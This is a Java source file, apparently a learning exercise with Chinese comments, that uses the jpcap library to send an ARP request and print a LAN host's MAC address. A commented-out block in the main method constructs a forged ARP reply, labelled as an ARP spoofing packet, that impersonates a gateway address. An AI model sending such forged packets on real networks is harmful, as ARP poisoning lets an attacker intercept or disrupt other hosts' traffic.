package com.tangqiang.jpcap.arp;

import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;

public class ModifyARP {

	static NetworkInterface[] devices = JpcapCaptor.getDeviceList(); // 得到主机A的网络设备列表

	/*
	 * 获取局域网内的某个主机的MAC地址，方法：发一个ARP请求，从ARP回复中得到MAC地址
	 */
	static byte[] getOtherMAC(String ip) throws IOException {
		JpcapCaptor jc = JpcapCaptor.openDevice(devices[0], 2000, false, 3000);
		JpcapSender sender = jc.getJpcapSenderInstance();
		InetAddress senderIP = InetAddress.getByName("10.1.33.222");// 主机A的IP地址
		InetAddress targetIP = InetAddress.getByName(ip); // 目标主机的IP地址
		byte[] broadcast = new byte[] { (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255 };// 广播地址
		ARPPacket arp = new ARPPacket();// 开始构造一个ARP包
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;
		arp.prototype = ARPPacket.PROTOTYPE_IP;
		arp.operation = ARPPacket.ARP_REQUEST; // 指明是ARP请求包
		arp.hlen = 6;
		arp.plen = 4;
		arp.sender_hardaddr = devices[0].mac_address; // ARP包的发送端以太网地址
		arp.sender_protoaddr = senderIP.getAddress(); // 发送端IP地址
		arp.target_hardaddr = broadcast;// 目的端以太网地址
		arp.target_protoaddr = targetIP.getAddress(); // 目的端IP地址

		EthernetPacket ether = new EthernetPacket(); // 构造以太网首部
		ether.frametype = EthernetPacket.ETHERTYPE_ARP; // 帧类型
		ether.src_mac = devices[0].mac_address; // 以太网源地址
		ether.dst_mac = broadcast; // 以太网目的地址
		arp.datalink = ether;

		sender.sendPacket(arp);

		while (true) { // 获取ARP回复包，从中提取出目的主机的MAC地址
			Packet p = jc.getPacket();
			if (p instanceof ARPPacket) {
				if (Arrays.equals(((ARPPacket)p).target_protoaddr, senderIP.getAddress())) {
					return ((ARPPacket)p).sender_hardaddr;
				}
			}
		}
	}

	public static void main(String[] args) throws IOException {

		String mac = "";
		for (byte b : getOtherMAC("10.1.33.113")) {
			mac += Integer.toHexString(b & 0xff) + ":";
		}
		System.out.println(" MAC address:" + mac);
		// JpcapCaptor captor = JpcapCaptor.openDevice(devices[1], 2000, false, 3000);
		// captor.setFilter("arp", true);
		// JpcapSender sender = captor.getJpcapSenderInstance();
		//
		// ARPPacket arp = new ARPPacket();// 构造ARP欺骗用的数据包，实质上就是一个ARP回复包
		// arp.hardtype = ARPPacket.HARDTYPE_ETHER;
		// arp.prototype = ARPPacket.PROTOTYPE_IP;
		// arp.operation = ARPPacket.ARP_REPLY;// 指明是ARP回复包
		// arp.hlen = 6;
		// arp.plen = 4;
		//
		// arp.sender_hardaddr = devices[0].mac_address;
		// arp.sender_protoaddr = InetAddress.getByName("192.168.10.1").getAddress();
		// arp.target_hardaddr = getOtherMAC("192.168.10.254");
		// arp.target_protoaddr = InetAddress.getByName("192.168.10.254").getAddress();
		//
		// EthernetPacket ether = new EthernetPacket();
		// ether.frametype = EthernetPacket.ETHERTYPE_ARP;
		// ether.src_mac = getOtherMAC("192.168.10.1");
		// ether.dst_mac = getOtherMAC("192.168.10.254");
		// arp.datalink = ether;
		//
		// sender.sendPacket(arp);

	}
}